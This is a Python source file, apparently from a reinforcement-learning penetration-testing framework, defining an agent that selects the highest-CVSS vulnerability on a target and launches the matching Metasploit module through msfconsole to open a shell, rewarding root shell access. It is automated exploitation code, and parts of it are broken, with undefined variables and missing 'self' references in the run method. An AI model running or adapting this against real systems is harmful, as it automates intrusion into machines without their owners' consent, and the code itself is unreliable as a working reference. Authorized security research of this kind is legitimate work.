import random
import subprocess

from agents.base_agent import BaseAgent

class ExploitAgent(BaseAgent):
    """
    Agent that attempts to exploit the target using the best known CVE.
    It selects the highest CVSS vulnerability and tests its effect.
    """

    def __init__(self, blackboard_api, replay_buffer, policy_model, state_encoder, action_encoder, command_cache, model, metasploit_dataset, exploitdb_dataset):
        super().__init__(
            name="ExploitAgent",
            action_space=[],
            blackboard_api=blackboard_api,
            replay_buffer=replay_buffer,
            policy_model=policy_model,
            state_encoder=state_encoder,
            action_encoder=action_encoder,
            command_cache=command_cache,
            model=model
        )
        self.metasploit_dataset = metasploit_dataset
        self.exploitdb_dataset = exploitdb_dataset

    def should_run(self):
        return True

    def get_reward(self, prev_flat: dict, action: str, next_flat: dict) -> float:
        # בדוק האם נוספו CVEs שנכשלו
        prev_failed = {k: v for k, v in prev_flat.items() if k.startswith("failed_cve_idx")}
        next_failed = {k: v for k, v in next_flat.items() if k.startswith("failed_cve_idx")}
        
        new_failed = set(next_failed.values()) - set(prev_failed.values())

        if new_failed:
            print(f"[Reward] New failed CVEs detected: {new_failed}")
            return -2.0  # ניסיון כושל חדש
        
        # אם אין CVE שנכשל עכשיו – נבדוק אם shell נפתח
        before_shell = prev_flat.get("attack_impact.shell_opened", 0.0)
        after_shell = next_flat.get("attack_impact.shell_opened", 0.0)

        if before_shell < 0.5 and after_shell >= 0.5:
            print("[Reward] Shell opened – success!")
            return 10.0

        return -0.5  # ניסיון שלא נכשל אבל גם לא הצליח

    def run(self):
        print("[+] ExploitAgent running...")
        state = self.blackboard_api.get_state_for_agent(self.name)
        vulnerabilities = state.get("vulnerabilities_found", [])

        if not vulnerabilities:
            print("[!] No CVEs found — skipping.")
            return

        # נבחר את הפגיעות עם הציון הכי גבוה
        best_cve = max(vulnerabilities, key=lambda v: v.get("cvss", 0))
        cve_id = best_cve["cve"]
        print(f"[ExploitAgent] Selected CVE: {cve_id} (CVSS: {best_cve.get('cvss', 0)})")

        # נזין את זה כ־action
        self.last_action = f"EXPLOIT_{cve_id}"
        self.actions_history.append(self.last_action)

        exploit_info = self.check_metasploit_dataset(cve_id)
        if exploit_info:
            success, output = run_metasploit_exploit_script(exploit_info)
        else:
            print(f"[!] No exploit found for {cve_id}")
            success = False
            state["failed_CVEs"].append(cve_id)

        # נעדכן את ה־blackboard בהתאם
        if success:
            shell = {"shell_type": "bash", "shell_access_level": "root"}
        else:
            shell = {}

        state["attack_impact"] = {"shell_opened": shell}
        self.blackboard_api.update_state(self.name, state)

        # הצפנה של מצב, חישוב תגמול, עדכון replay buffer
        prev_vector = self.state_encoder.encode(prev_state_dict, actions)
        next_vector = self.state_encoder.encode(next_state_dict, actions)
        reward = self.get_reward(prev_vector, action, next_vector)

        experience = {
            "state": encoded_state,
            "action": 0,  # אין פעולה ממשית - רק סימולציה
            "reward": reward,
            "next_state": encoded_next_state
        }
        self.replay_buffer.add_experience(**experience)

        print(f"[ExploitAgent] Exploit {'Succeeded' if success else 'Failed'} — Reward: {reward:.2f}")

    def get_exploit_path_for_cve(self, cve_id):
        exploit = check_metasploit_dataset(cve_id)
        if exploit is None:
            exploit = check_exploitdb_dataset(cve_id)
        return exploit
    
    def check_metasploit_dataset(self, cve_id):
        """
        מחפש את ה־CVE הרצוי בתוך מאגר Metasploit ומחזיר את הרשומה המלאה אם נמצא.

        Args:
            cve_id (str): מזהה CVE לחיפוש (למשל 'CVE-2018-14665').

        Returns:
            dict | None: רשומת אקפלויט תואמת או None אם לא נמצא.
        """
        for entry in self.metasploit_dataset:
            if entry.get("cve") == cve_id:
                return entry
        return None
    
    def run_metasploit_exploit_script(self, exploit_info):
        """
        מריץ את האקפלויט בפקודה אחת דרך msfconsole -q -x "<פקודות>", בלי שימוש ב־pexpect.
        """
        exploit_path = exploit_info.get("exploit_path")
        payload = exploit_info.get("default_payload")
        options = exploit_info.get("required_options", {})

        if not exploit_path:
            print("[✗] exploit_path is missing.")
            return False, ""

        print(f"[⚙️] Launching Metasploit exploit: {exploit_path}")

        # הרכבת מחרוזת פקודות
        commands = [f"use {exploit_path}"]

        if payload:
            commands.append(f"set PAYLOAD {payload}")

        for key, val in options.items():
            if val:
                commands.append(f"set {key} {val}")

        commands.append("run -z")   # -z = no interaction
        commands.append("exit")     # יציאה מ־msfconsole

        full_command = "; ".join(commands)

        try:
            result = subprocess.run(
                ["msfconsole", "-q", "-x", full_command],
                capture_output=True,
                text=True,
                timeout=90
            )
            output = result.stdout + result.stderr

            success = any(term in output.lower() for term in ["session", "exploit completed", "shell"])
            if success:
                print("[✓] Exploit Succeeded")
            else:
                print("[✗] Exploit Failed")

            return success, output

        except subprocess.TimeoutExpired:
            print("[!] Timeout expired while running exploit.")
            return False, ""
        except Exception as e:
            print(f"[!] Error: {e}")
            return False, ""

    def check_exploitdb_dataset(self, cve_id):
        return None
